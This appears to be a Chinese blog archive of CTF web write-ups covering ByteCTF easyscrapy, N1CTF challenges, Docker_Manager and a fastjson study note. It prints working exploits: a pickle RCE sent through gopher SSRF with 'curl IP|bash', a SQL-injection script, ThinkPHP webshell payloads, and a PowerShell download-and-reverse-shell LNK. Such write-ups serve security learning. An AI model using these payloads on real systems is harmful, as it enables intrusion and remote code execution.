联系到上面的scrapy_redis,我们不难推测,scrapy会爬我们存储的那个url,并将当时的内容缓存(后面会发现是mongodb)。所以这就导致,反复用result页面请求url并不会改变回显内容。充其量调用了pycurl请求而已。 那么，到此我们对整个服务的构架有了大概的思路 存在爬虫bot 存在redis 可能存在某数据库 pycurl 是web服务请求，scrapy_redis是爬虫bot请求 但是这些信息非常局限。首先只有存进redis的数据才会被爬虫请求,这里python没有crlf必然打不了redis.而pycurl虽然可以用gopher那一套打,但是内网信息未知,且没有回显。 这时我开始尝试性爬一些网站。讽刺的是baidu能爬它自己的bytedance爬不了2333. 然后爬本机127.0.0.1也完全没有内容(因为bot开了端口的服务实际上只有一个6023的telnet,打了会提前报错,一样无回显) 那么,不妨尝试下打它的公网ip？这时我发现一个奇怪的现象。当我输入它的公网ip存进redis后，它除了本身，还读取了/list的页面。 那么这是为什么呢？我简单看了下页面。发现里面存在&lt;a href=&quot;/list&quot;&gt;&lt;/&gt;看来，爬虫端是会根据&lt;a href=&quot;xxx&quot;&gt;&lt;/a&gt;进行进一步爬取.经过经典的实验打自己，发现的确它会顺着这个href进行请求。 此时已经知道href有猫腻了。然后出题人已经放出了第一个hint。就是尝试读源码。 那么我们不妨尝试下，顺着这个href+file协议进行源码的阅读？ leak source code在自己的服务器上存储 1&lt;html&gt;&lt;a href=\"file:///etc/passwd\"&gt;&lt;/a&gt;&lt;/html&gt; 接着上面的脚本跑一遍。一把梭解决问题。再次访问/result。发现读到了/etc/passwd 既然如此，我们依次读下其他内容/proc/self/cmdline 1/bin/bash run.sh /proc/self/environ得知当前PWD是/code 读/code/run.sh 12#!/bin/bashscrapy crawl byte 使用的是scrapy框架进行爬取。 此时开始自己盲目的读结果发现啥都没读到,想了想发现这个爬虫bot可能只有这么一个命令在运行。那么我应该去查找scrapy的文档我们找到scrapy官方文档 显然我们只需读取scrapy.cfg就能拿到scrapy项目名并读取到下面所有文件。不过spider的名字似乎是自定义的 前面命令行执行的是scrapy crawl byte那么可以确认spider的name是byte.文件名也可能是byte. 1234567891011# Automatically created by: scrapy startproject## For more information about the [deploy] section see:# https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html[settings]default &#x3D; bytectf.settings[deploy]#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;project &#x3D; bytectf 其他内容也都一并读取。完整的文件我会放自己github上。包括redis跟mongodb的docker 此时我通过pipelines.py与settings.py分别得到了mongodb与redis的配置 1234567891011121314151617181920212223242526//pipelines.pyimport pymongoclass BytectfPipeline: def __init__(self): MONGODB_HOST = '127.0.0.1' MONGODB_PORT = 27017 MONGODB_DBNAME = 'result' MONGODB_TABLE = 'result' MONGODB_USER = 'N0rth3' MONGODB_PASSWD = 'E7B70D0456DAD39E22735E0AC64A69AD' mongo_client = pymongo.MongoClient(\"%s:%d\" % (MONGODB_HOST, MONGODB_PORT)) mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME) mongo_db = mongo_client[MONGODB_DBNAME] self.table = mongo_db[MONGODB_TABLE] def process_item(self, item, spider): quote_info = dict(item) print(quote_info) self.table.insert(quote_info) return item 123456789101112131415//settings.pyBOT_NAME = 'bytectf'SPIDER_MODULES = ['bytectf.spiders']NEWSPIDER_MODULE = 'bytectf.spiders'RETRY_ENABLED = FalseROBOTSTXT_OBEY = FalseDOWNLOAD_TIMEOUT = 8USER_AGENT = 'scrapy_redis'SCHEDULER = \"scrapy_redis.scheduler.Scheduler\"DUPEFILTER_CLASS = \"scrapy_redis.dupefilter.RFPDupeFilter\"REDIS_HOST = '172.20.0.7'REDIS_PORT = 6379ITEM_PIPELINES = &#123; 'bytectf.pipelines.BytectfPipeline': 300,&#125; 以及主要的爬虫逻辑。知道了文件读取的漏洞所在 1234567891011121314151617181920212223242526272829303132333435import scrapyimport reimport base64from scrapy_redis.spiders import RedisSpiderfrom bytectf.items import BytectfItemclass ByteSpider(RedisSpider): name = 'byte' def parse(self, response): byte_item = BytectfItem() byte_item['byte_start'] = response.request.url url_list = [] test = response.xpath('//a/@href').getall() for i in test: if i[0] == '/': url = response.request.url + i else: url = i if re.search(r'://',url): r = scrapy.Request(url,callback=self.parse2,dont_filter=True) r.meta['item'] = byte_item yield r url_list.append(url) if(len(url_list)&gt;3): break byte_item['byte_url'] = response.request.url byte_item['byte_text'] = base64.b64encode((response.text).encode('utf-8')) yield byte_item def parse2(self,response): item = response.meta['item'] item['byte_url'] = response.request.url item['byte_text'] = base64.b64encode((response.text).encode('utf-8')) yield item 可是这有什么用呢……我们一样不知道flag在哪。目前看来,如果flag在bot机器上,那么只有可能会是打redis。并且按照我自己的少数经验，一般是搭配pickle反序列化rce才有可能。但是这里并没有明显的pickle反序列化代码。 此时陷入僵局，只有本地调试一下看看有没有意外发生了。 Run it locally这道题最重要的一点恐怕就是本地跑了。毕竟此时我们对环境一无所知,我唯一能想到的getshell方法也只有pickle反序列化了。那么试试本地，看看有没有键存了pickle序列化后的数据？这样一来必然有某个地方存在反序列化。 经过一番折腾后。我简单写了个起mongodb的docker.因为redis跟爬虫本地起比较轻松,我又不想改代码。(后面比赛结束时写了个完整版的,直接起应该跟线上的bot+redis+mongo环境基本一致了)docker-compose.yml 123456789101112version: '3'services: mongodb: image: mongo:4.2 container_name: py_db restart: always environment: MONGO_INITDB_ROOT_USERNAME: root MONGO_INITDB_ROOT_PASSWORD: root MONGO_INITDB_DATABASE: result volumes: - ./mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro 同目录下mongo-init.js 12345678var data=&#123;\"test\":\"123\"&#125;//just for testdb.result.drop();db.result.insert(data);db.createUser(&#123; user: \"N0rth3\", pwd: \"E7B70D0456DAD39E22735E0AC64A69AD\", roles: [ &#123; role: \"readWrite\", db: \"result\", collection:\"result\" &#125;]&#125;); 简单改下爬虫的redis/mongodb ip ,就能开跑了 然后此时我发现一点动静的都没有。感觉非常奇怪。倒是看到scrapy它在准备读byte:start_urls 既然如此那set xx xxx试试看好了。结果突然发现爬虫直接异常退出？ 看了下报错。似乎是在执行redis的LPOP操作报错的。那可能是数据类型的问题了。找了下一篇文章发现了原因。 https://blog.csdn.net/zwq912318834/article/details/78854571它爬虫的逻辑跟我们的基本一致。属于分布式爬虫。即等待redis中出现redis_key再进行爬取。而这里因为不是简单的从字符串进行读取，而是从一个队列里读一个元素。那么自然不会读到内容了。 期间,转战虚拟机起服务。这一次我们用脚本写入数据。其实就是执行lpush而已。 123456789#!/usr/bin/env python# -*- coding:utf-8 -*-import redisredis_Host = \"127.0.0.1\"redis_key = 'byte:start_urls'rediscli = redis.Redis(host = redis_Host, port = 6379, db = \"0\")rediscli.lpush(redis_key, \"http://www.baidu.com\") 这时就可以成功写入,爬取数据，并将数据存进mongodb。这里我再尝试打一遍redis跟mongodb。发现跟服务端远程是一致的。打redis会提前报错终止，打mongodb会有回显 不过这里redis因为lpop这个操作。导致我写入的这个list很快就会消失。它存的也不是pickle数据。那么要怎么rce?此时再度陷入僵局 此时官方放出第三个hint scrapy_redis,题目仍是0解。我开始想scrapy_redis我第一天上午就发现了还需要提示？但是转念想会不会我想要的pickle操作存在于scrapy_redis呢？ https://github.com/rmax/scrapy-redis 于是。我用scrapy-redis github上的example-project跑了遍。这个demo是指定了url一直在爬的。于是当我连进redis时，我发现了3个键。并且当我查看他们的时候,终于发现了心心念念的内容也就是pickle的序列化数据。 既然存在pickle序列化的数据。那么必然某个地方会反序列化它。这样一来rce的链条立马就清楚了。设置键 -&gt; pickle rce 跟pwnhub6月赛差不多了。 但是本地为什么没有byte:requests出现呢？我怀疑是因为每次只传入一个url。导致存活时间极短。那么我们不妨用大量数据填充进redis。方法也很简单，上面的脚本加个for循环200次就好了。然后我们在redis里执行几次看看zrange byte:requests 0 1 既然如此。利用链就清楚了：想办法写入byte:requests键，内容为序列化数据。而写入键唯有pycurl的ssrf可以做到。 下面就是利用了 ssrf -&gt; rce exploit这里我们首先尝试一下直接写入byte:requests会怎么样。然后惊喜的发现只要写入就会直接触发反序列化。那么也就是说直接利用/result?url就可以打了。 然后推测一波版本，这里我打远程用的protocol协议为2.0的pickle成功了。当时getshell没看python版本,估计是2.7.(scrapy 一般在2.7 或3.5/3.6跑) 一个比较头疼的点是如何写入opcode的16进制数据。之前pwnhub6月赛时写pickle数据是因为crlf比较简单。可以直接加个引号括起来写。这里我们只能gopher打。那么转数据时出了不少麻烦。最后我简单改了下redis-ssrf这个脚本的内容。用python2 跑。确认它不会像python3那样自动转义我的16进制字符串。终于构造出可以打的payload python3 运行以得到pickle 16进制序列化数据。py2的直接写貌似有点问题。 1234567891011import pickleimport osclass exp(object): def __reduce__(self): s = \"\"\"curl 120.27.246.202|bash\"\"\" return (os.system, (s,))e = exp()s = pickle.dumps(e,protocol=2)print(s) python2 运行 convert.py注意我们执行的是zadd。因为之前本地已经知道了requests是zset类型数据。 123456789101112131415161718192021222324252627282930313233343536373839from urllib import quotedef set_key(key,payload): cmd=[ \"zadd &#123;0&#125; 1 &#123;1&#125;\".format(key,payload), \"quit\" ] return cmddef redis_format(arr): CRLF=\"\\r\\n\" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x)))+CRLF+x cmd+=CRLF return cmddef generate_payload(): key = \"byte:requests\" payload =\"\"\"\\x80\\x02cposix\\nsystem\\nq\\x00X\\x18\\x00\\x00\\x00curl 120.27.246.202|bashq\\x01\\x85q\\x02Rq\\x03.\"\"\".replace(' ','\\x12') cmd=set_key(key,payload) protocol=\"gopher://\" ip=\"172.20.0.7\" port=\"6379\" payload=protocol+ip+\":\"+port+\"/_\" for x in cmd: payload += quote(redis_format(x).replace(\"^\",\" \")) return payloadif __name__==\"__main__\": passwd = '' p=generate_payload() print(p.replace('%12','%20')) 一个小坑是我的空格总是会被错转。于是干脆先把空格填充一下最后再换回%20即可。 打本地成了后，远程必然没有问题了。最后因为get传参,我们注意二次url编码即可。执行命令curl xxx|bash(读文件确认有bash,pycurl确认有curl,同时之前把命令往tmp下写时发现有readflag) getshell :) summary 所以非常可惜。利用链想好后结果去赶飞机错过了比赛中解出的机会。不过思路还是很考验人的。题目质量很高。就是本地环境有点磨人。。。 最后分享下我按照源码搭好的docker环境。https://github.com/baiyecha404/CTFWEBchallenge/tree/master/bytectf2020/easyscrapy","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"},{"name":"redis","slug":"redis","permalink":"https://www.bycsec.top/tags/redis/"}]},{"title":"N1CTF2020","slug":"N1CTF2020","date":"2020-10-19T13:11:14.000Z","updated":"2021-02-18T05:09:36.903Z","comments":true,"path":"2020/10/19/N1CTF2020/","link":"","permalink":"https://www.bycsec.top/2020/10/19/N1CTF2020/","excerpt":"N1CTF的题目质量毋庸置疑,可惜自己能力不足。除了签到还看了easytp5,filters,还有渗透系列的Victim.基本都没思路或者思路跑偏了……抓紧复现下来学习学习。","text":"N1CTF的题目质量毋庸置疑,可惜自己能力不足。除了签到还看了easytp5,filters,还有渗透系列的Victim.基本都没思路或者思路跑偏了……抓紧复现下来学习学习。 signin这题拿的二血难受死了,错失空指针邀请码……(西湖upload也是二血,自己人最近也有点水逆，难道这就是2的诅咒么？:( ) source 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class ip &#123; public $ip; public function waf($info)&#123; &#125; public function __construct() &#123; if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $this-&gt;ip = $this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']); &#125;else&#123; $this-&gt;ip =$_SERVER[\"REMOTE_ADDR\"]; &#125; &#125; public function __toString()&#123; $con=mysqli_connect(\"localhost\",\"root\",\"********\",\"n1ctf_websign\"); $sqlquery=sprintf(\"INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')\",$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time()); if(!mysqli_query($con,$sqlquery))&#123; return mysqli_error($con); &#125;else&#123; return \"your ip looks ok!\"; &#125; mysqli_close($con); &#125;&#125;class flag &#123; public $ip; public $check; public function __construct($ip) &#123; $this-&gt;ip = $ip; &#125; public function getflag()&#123; if(md5($this-&gt;check)===md5(\"key****************\"))&#123; readfile('/flag'); &#125; return $this-&gt;ip; &#125; public function __wakeup()&#123; if(stristr($this-&gt;ip, \"n1ctf\")!==False) $this-&gt;ip = \"welcome to n1ctf2020\"; else $this-&gt;ip = \"noip\"; &#125; public function __destruct() &#123; echo $this-&gt;getflag(); &#125;&#125;if(isset($_GET['input']))&#123; $input = $_GET['input']; unserialize($input);&#125; 显然我们需要getflag的话,需要拿到数据库里的key.而key需要通过sql注入获取。这里唯一存在注入的地方在ip的__toString中。故通过反序列化触发__toString即可。设置flag类的ip为ip类就可以在stristr处触发了。 接下来就是黑盒waf下进行注入的事了。我的思路比较直接。直接时间盲注。当然这里稍微构造下进行报错盲注也是可以的。(因为__toString的返回值会与n1ctf比较,而__toString返回值有mysql报错与”your ip looks ok!”两种，那么就可以构造报错从而产生布尔值来盲注了) 时间盲注的话,由于ban了不少关键词,所以我是现学的新方法select rpad(&#39;a&#39;,2999999,&#39;a&#39;) regexp concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) 其实挺像 js里的正则盲注的。当然其实从其他几种时间盲注方法如heavy query就可以推出这种令服务端产生负荷的方法必然可行233。然后题目只waf掉了rpad,rpad不能用的话改成lpad就好了:) exp 1234567891011121314151617181920212223242526272829303132333435363738import requestsimport timeimport stringurl='http://101.32.205.189/'def getflag(payload): r = requests.get(url, params=&#123;'input': payload&#125;) print(r.text)#key n1ctf20205bf75ab0a30dfc0cdef sqli(): res=\"\" for i in range(1,50): print(i) for j in string.printable: headers = &#123; #'X-Forwarded-For': \"1'^(if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),\"+str(i)+\",1))=\" + str(ord(j)) + \",(select lpad('a',2999999,'a') regexp concat(repeat('(a.*)+',30),'b')),0))^'1\" #'X-Forwarded-For': \"1'^(if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='n1key'),\"+str(i)+\",1))=\" + str(j) + \",(select lpad('a',2999999,'a') regexp concat(repeat('(a.*)+',30),'b')),0))^'1\" 'X-Forwarded-For': \"1'^(if(ascii(substr((select `2` from (select 1,2 union select * from n1key)a limit 1,1),\"+str(i)+\",1))=\" + str(ord(j)) + \",(select lpad('a',2999999,'a') regexp concat(repeat('(a.*)+',30),'b')),0))^'1\" # select `2` from (select 1,2 union select * from n1key) a limit 1,1 &#125; t = time.time() r = requests.get(url, params=&#123;'input': payload&#125;, headers=headers) if 'hack' in r.text: print('banwords') if time.time() - t &gt; 2.5: res +=j print(res) breakif __name__==\"__main__\": #sqli('O:4:\"flag\":2:&#123;s:2:\"ip\";O:2:\"ip\":1:&#123;s:2:\"ip\";N;&#125;s:5:\"check\";N;&#125;') getflag('O:4:\"flag\":2:&#123;s:2:\"ip\";N;s:5:\"check\";s:25:\"n1ctf20205bf75ab0a30dfc0c\";&#125;') 这里浪费我时间最久的就是最后一步select key from n1key,导致错失一血。试了好久还换了一种注法才怀疑是他服务端waf了这个语句。然后尝试性的改成无列名注入select `2` from (select 1,2 union select * from n1key)a limit 1,1就成了 orz. 所以可能还是自己太菜才错失良机吧。 filterssource 123456789101112131415161718192021&lt;?phpisset($_POST['filters'])?print_r(\"show me your filters!\"): die(highlight_file(__FILE__));$input = explode(\"/\",$_POST['filters']);$source_file = \"/var/tmp/\".sha1($_SERVER[\"REMOTE_ADDR\"]);$file_contents = [];foreach($input as $filter)&#123; array_push($file_contents, file_get_contents(\"php://filter/\".$filter.\"/resource=/usr/bin/php\"));&#125;shuffle($file_contents);file_put_contents($source_file, $file_contents);try &#123; require_once $source_file;&#125;catch(\\Throwable $e)&#123; pass;&#125;unlink($source_file);?&gt; 这题自己就没做出来了。不过可以分享下我当时的思路,我感觉应该是控制filter过滤器多层组合fuzz来构造任意字符。也就是说前提是在resource始终为/usr/bin/php下的。 假如这里不是file_get_contents的话其实很简单,因为过滤器的内容可以使用我们自定义的,所以像 12php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13|&lt;?cuc @riny($_CBFG[Dsgz])?&gt;&#x2F;resource&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSb[cy)]?; &gt; 可以在file_put_contents()时写入指定文件。并且warning不影响写入。不过出题人肯定知道这点所以是先file_get_contents再file_put_contents。并且文件名的参数也不可控，所以就不知道是什么奇淫技巧了。 ps: 看到官方wp的确是fuzz构造字符。有点orange 的 oneline php challenge那味了。 看到SuperGusser的wp后感觉他们的思路是真的简单。。。 1filters&#x3D;resource&#x3D;data:,&lt;?php%20system(&#39;ls&#39;);?&gt; 直接最质朴的data协议写入,不用带上text,plain,base64之类的。那么后面的内容都被当做data的内容了。所以根本不用管/了 easytp5smile大师傅的题必然少不了thinkphp ?这题我思路有点走偏了，其实要是按照原来暑假跟过的tp5.0 的rce思路应该会顺利多了。 以下内容可以在直接学习tp漏洞的笔记找到首先是一个tp5 rce的通用点。那就是可以通过控制器来覆盖值。在Request.php 1234if (isset($_POST[Config::get('var_method')])) &#123; $this-&gt;method = strtoupper($_POST[Config::get('var_method')]); $this-&gt;&#123;$this-&gt;method&#125;($_POST);&#125; 典型的就是可以调用Request任意方法并以$_POST为参数。然后进__construct后 12345678910public function __construct($options = [])&#123; foreach ($options as $name =&gt; $item) &#123; if (property_exists($this, $name)) &#123; $this-&gt;$name = $item; &#125; &#125; if (is_null($this-&gt;filter)) &#123; $this-&gt;filter = Config::get('default_filter'); &#125;&#125; 有一个任意参数覆盖。所以还是利用这个类的所有可控参数来找gadget打。这里继续下断点一路跟发现会根据app_debug的值前往当前类下param方法。而这个方法全都走input方法。也就是都会调用了call_user_func。 123456789101112131415//inputif (is_array($data)) &#123; array_walk_recursive($data, [$this, 'filterValue'], $filter); reset($data);&#125; //filterValueprivate function filterValue(&amp;$value, $key, $filters)&#123; $default = array_pop($filters); foreach ($filters as $filter) &#123; if (is_callable($filter)) &#123; // 调用函数或者方法过滤 $value = call_user_func($filter, $value); &#125; elseif (is_scalar($value)) &#123; 以上部分跟tp5的rce思路完全一致。只不过题目设置了disable_function,以及禁用了一些单参数函数。导致大部分payload都不可行。 那么比较重要的就是找gadget了。我们可以控制filter,然后进行任意方法的单参数rce.不过由于for循环循环调用$value.所以可以搭配gadget进行rce.这里可以找恶意函数找到evalthinkphp\\library\\think\\view\\driver\\Php.php 1234567891011public function display($content, $data = [])&#123; if (isset($data['content'])) &#123; $__content__ = $content; extract($data, EXTR_OVERWRITE); eval('?&gt;' . $__content__); &#125; else &#123; extract($data, EXTR_OVERWRITE); eval('?&gt;' . $content); &#125;&#125; 因为这里的直接调用会报错,所以看到SuperGuesser的wp里提到了设置set_error_handler 为任意其他函数来避免tp的默认错误处理。此处是implode.那么就可以直接继续了。关于filter的调用。就是这四次调用 12341.set_error_handler &quot;implode&quot;2.self::path base64-payload 3.base64_decode base64-payload 4.\\think\\view\\driver\\Php::Display payload payload 12345http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;?s&#x3D;captcha&amp;g&#x3D;implode&quot;post:path&#x3D;PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ2J5Yy5waHAnLCc8P3BocCBldmFsKCRfUkVRVUVTVFtieWNdKTs&#x2F;PicpOyA&#x2F;Pg&#x3D;&#x3D;&amp;_method&#x3D;__construct&amp;filter[]&#x3D;set_error_handler&amp;filter[]&#x3D;self::path&amp;filter[]&#x3D;base64_decode&amp;filter[]&#x3D;\\think\\view\\driver\\Php::Display&amp;method&#x3D;GET 这里我觉得利用::的确意想不到。以为按照自己的认识来说::是用来访问静态属性跟方法。没想到是可以调非静态的(有warning).基于上面已经解决了tp报错的问题,这里也就没啥问题了。 看到smi1e分享了其他一些非预期解以及预期解。打算跟一跟 The king of phish (Victim bot)source 12345678910111213141516171819202122232425262728293031323334353637383940import osimport uuidimport LnkParse3 as Lnkfrom flask import Flask, requestapp = Flask(__name__)@app.route('/')def index(): source = open(__file__, 'r').read().replace(\"\\n\", \"\\x3c\\x62\\x72\\x3e\").replace(\" \", \"\\x26\\x6e\\x62\\x73\\x70\\x3b\") return source@app.route('/send', methods=['POST'])def sendFile(): if 'file' not in request.files: return 'No file part' file = request.files['file'] if file.filename == '': return 'No selected file' data = file.stream.read() if not data.startswith(b\"\\x4c\\x00\"): return \"You're a bad guy!\" shortcut = Lnk.lnk_file(indata=data) if shortcut.data['command_line_arguments'].count(\" \"): return \"File is killed by antivirus.\" filename = str(uuid.uuid4())+\".lnk\" fullname = os.path.join(os.path.abspath(os.curdir) + \"/uploads\", filename) open(fullname, \"wb\").write(data) clickLnk(fullname) return \"Clicked.\"def clickLnk(lnkPath): os.system('cmd /c \"%s\"' % lnkPath)if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) 这里开始主要是被lnk的命令里bypass 空格给困扰了。后来想起来不用空格还可以用其他不可见字符.那就很简单了。用\\t替换下空格即可。結果找半天没找到恶意lnk的生成工具。。。 最后今天复现时找到一个windows上的。 https://github.com/fireeye/SharPersist用以下命令即可生成lnk文件. 1SharPersist.exe -t startupfolder -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"IEX(New-Object`tNet.WebClient).DownloadString('http://xxx/byc.ps1')\" -f \"byc1\" -m add 这里用到一个小技巧：powershell命令行下可以直接用`t 来表示字符串中的\\t。 然后开始准备用的是nishang的反弹shell脚本。结果没反应,感觉是被防火墙拦了。所以就换了个简单的服务器上的byc.ps1 1$client = New-Object System.Net.Sockets.TCPClient(\"10.0.2.4\",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close() 最后发送即可getshell flag在userA 桌面n1ctf{I&#39;m_a_little_fish,_swimming_in_the_ocean} 后面拿域控的思路就没有了… Docker_ManagerBUU上面又复现了两题。zabbix_fun直接拿exp打的。Docker_Manager可以记录下 赵总的wp很详细了。学到很多https://www.zhaoj.in/read-6750.html 题目核心代码基本就是下面了 1234$cmd = 'curl --connect-timeout 10 ' . $host_addr . ' -g ' . $cert . $key . $cacert;$output = array();$ret = 0;exec($cmd, $output, $ret); 显然就是一个curl的参数注入。但是利用起来比较有趣。 You tell curl to read more command-line options from a specific file with the -K/–config option, like this: -K是可以读取一个配置文件的。然后如果配置文件demo如下 1234567891011# --- Example file ---# this is a commenturl &#x3D; &quot;example.com&quot;output &#x3D; &quot;curlhere.html&quot;user-agent &#x3D; &quot;superagent&#x2F;1.0&quot; # and fetch another URL toourl &#x3D; &quot;example.com&#x2F;docs&#x2F;manpage.html&quot;-Oreferer &#x3D; &quot;http:&#x2F;&#x2F;nowhereatall.example.com&#x2F;&quot;# --- End of example file --- 也就是说，只要K能加载到设计过的配置文件，就能读内容并输出。这只用到了-K一个指令，即可达成写shell的目的。然后就是非常巧妙的一个利用了。我们需要想办法读到配置文件，而这就是利用了/proc/xxx/cmdline原来我们知道，/proc/self/cmdline常用于读取java,python这样的web应用的一些简单配置。但是实际上其他命令行或者说一个pid都会对应其运行时的命令即/proc/{pid}/cmdline。 那么假如我们有办法让cmdline长时间驻留，就可以爆破pid读取到配置文件。这里可以利用/dev/urandom等等文件。实际上dev下很多没有实际大小的文件都可以用来读取。 那么首先我们利用换行符,就能在某个pid的cmdline构造如下的一个配置文件 1view.php?host&#x3D;-K&#x2F;dev&#x2F;urandom%00&amp;cacert&#x3D;111%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0aurl&#x3D;&quot;http:&#x2F;&#x2F;frps:9001&#x2F;byc.php&quot;%0aoutput&#x3D;&quot;img&#x2F;byc.php&quot;%0a%0a%0a%0a%0a%0a%0a 12345678curl --connect-timeout 10 '-K/dev/urandom' --cacert='111url=\"http://frps:9001/byc.php\"output=\"img/byc.php\" 接下来就是同样的办法爆破-K/proc/xx/cmdline，从而加载上面的配置文件，写进shell getshell后 trap &quot;&quot; 14 &amp;&amp; /readflag即可。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"学习笔记-Java深入","slug":"学习笔记-Java深入","date":"2020-10-09T13:21:48.000Z","updated":"2021-02-18T05:08:43.422Z","comments":true,"path":"2020/10/09/学习笔记-Java深入/","link":"","permalink":"https://www.bycsec.top/2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/","excerpt":"java继续开坑学习。看到哪个学哪个，shiro懒得看了。","text":"java继续开坑学习。看到哪个学哪个，shiro懒得看了。 fastjsonexp利用不必多说，主要是学习下原理。以下都在jdk1.8调试。 可以按wh1t3p1g师傅的博文学习。https://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/ 三个demo类 12345678910111213141516171819public class Person &#123; public String name; public Phone phone; public Person() &#123; &#125; public Person(String name, Phone phone) &#123; this.name = name; this.phone = phone; &#125; @Override public String toString()&#123; return name+\":\"+phone; &#125;&#125; 123456789101112131415public class Phone &#123; public String phoneNumber; public Phone() &#123; &#125; public Phone(String phoneNumber) &#123; this.phoneNumber = phoneNumber; &#125; public String toString()&#123; return this.phoneNumber; &#125;&#125; 123456789101112131415public class NewPhone extends Phone &#123; public String location; public NewPhone()&#123; &#125; public NewPhone(String phoneNumber, String location) &#123; this.phoneNumber = phoneNumber; this.location = location; &#125; public String toString()&#123; return this.phoneNumber+\":\"+this.location; &#125;&#125; fastjson库一般我们重点关注几个基本功能方法 JSON.toJSONString() JSON.parse() JSON.parseObject() Test 123456789101112131415161718192021import com.alibaba.fastjson.JSON;public class Test &#123; public static void main(String[] args) &#123; Person person = new Person(\"byc_404\",new Phone(\"123123123\")); //Person person = new Person(\"byc_404\",new NewPhone(\"123123123\",\"china\")); String json = JSON.toJSONString(person); System.out.println(json); Person p = JSON.parseObject(json, Person.class); System.out.println(p); &#125;&#125;//ouput://1.//&#123;\"name\":\"byc_404\",\"phone\":&#123;\"phoneNumber\":\"123123123\"&#125;&#125;//byc_404:123123123//2.//&#123;\"name\":\"byc_404\",\"phone\":&#123;\"location\":\"china\",\"phoneNumber\":\"123123123\"&#125;&#125;//byc_404:123123123 这里最显著的问题就是。我们两次执行代码时在parseObject后输出的结果是一致的。这显然不符合我们的预期,因为这直接丢失了newphone类的location属性。 由于fastjson不知道需要还原的Person的Phone是本身还是子类NewPhone，面对这种多态方式，fastjson还原的是父类，而不是子类NewPhone 在这种情况下就产生了autotype.我们将上面TOJSONString这行代码更改下 12345String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);//output//&#123;\"@type\":\"Person\",\"name\":\"john\",\"phone\":&#123;\"@type\":\"NewPhone\",\"location\":\"china\",\"phoneNumber\":\"123123123\"&#125;&#125;//john:123123123:china 这里我们可以看到@type帮助我们避免了子类丢失字段的问题,成功还原了对象。但是我们自然可以想到,如果将其指定为恶意类,就可能导致恶意代码执行了。这就是最早的fastjson版本的rce漏洞。 然后因为本地jdk1.8版本太高就不复现了……打法自然是rmi / ldap两种方法。 这里提一下fastjson之所以能执行一系列方法的起因:fastjson 自动调用getter和setter以及无参数的构造函数 这里不深入跟,直接给出结论setter提取条件： 函数名长度大于等于4 非静态函数 限制返回类型为void或当前类 函数参数只有一个 函数名以set开头，第四个字符是大写或者unicde或者_或者字母f；如果函数名长度&gt;=5，看第5位字符是不是大写的 getter提取条件： 函数名长度大于等于4 非静态函数 函数名以get开头，第四个字符大写 函数参数为0个 函数的返回类型为Collection的子类或本身、Map的子类或本身、 AtomicBoolean、AtomicInteger、AtomicLong无相对应的setter函数 经过上述的两个条件提取后，保留了符合条件的getter和setter，并于com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValue函数中invoke调用，也就是说实现了类似反序列化过程中主动调用readObject函数的效果。 由条件，此时可以利用传入某字段的方式来主动调用相关符合条件的setter和getter。例如在Person里面添加一个setTest函数，并在需要转化的json中添加”test”:1，这将会主动调用setTest。如下 1234public void setTest(String test) &#123; this.test = test; System.out.println(\"setTest Method called!\");&#125; 1234567String json=\"&#123;\\\"name\\\":\\\"byc_404\\\",\\\"phone\\\":&#123;\\\"phoneNumber\\\":\\\"123123123\\\"&#125;,\\\"test\\\":\\\"1\\\"&#125;\";Person p = JSON.parseObject(json, Person.class);System.out.println(p);//output://setTest Method called!//byc_404:123123123 我们在利用@type构造有危害的利用链时，主要就是查找有危害的无参数的构造函数、符合条件的getter和setter。 1.2.24 修复 bypass然后改下maven里fastjson依赖看看高一个版本的fastjson防护。发现多了一个checkAutoType方法。当然这个版本同时需要手动开启autoType. 1234567891011121314151617if (this.autoTypeSupport || expectClass != null) &#123; int i; String deny; for(i = 0; i &lt; this.acceptList.length; ++i) &#123; deny = this.acceptList[i]; if 